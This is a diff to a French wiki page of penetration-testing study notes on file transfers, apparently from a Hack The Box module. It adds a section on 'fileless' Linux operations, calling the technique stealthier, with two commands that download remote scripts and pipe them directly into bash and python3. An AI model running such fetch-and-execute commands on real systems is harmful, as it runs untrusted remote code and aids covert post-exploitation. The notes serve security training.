@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-20T16:11:36.974Z
+date: 2025-04-20T16:13:55.447Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -381,4 +381,16 @@ curl <URI> -o <fichier de sortie>
 ### Fileless Attacks Using Linux
 
 Il est possible d'utiliser la fonction de [piping](https://www.geeksforgeeks.org/piping-in-unix-or-linux/) sur Linux pour effectuer des opérations sans fichiers. Cela signifie qu'aucun fichier n'est écrit sur le disque, et par conséquent plus discret.
+
+Certains payloads, comme mkfifo, écrivent des fichiers sur le disque. Même si l'exécution peut être "fileless" (sans fichier) en utilisant un pipe, certains payloads peuvent créer des fichiers temporaires sur le système d'exploitation.
+
+Exemple d'opération sans fichier avec Curl:
+```
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+
+Exemple d'opération sans fichier avec Wget:
+```
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
 
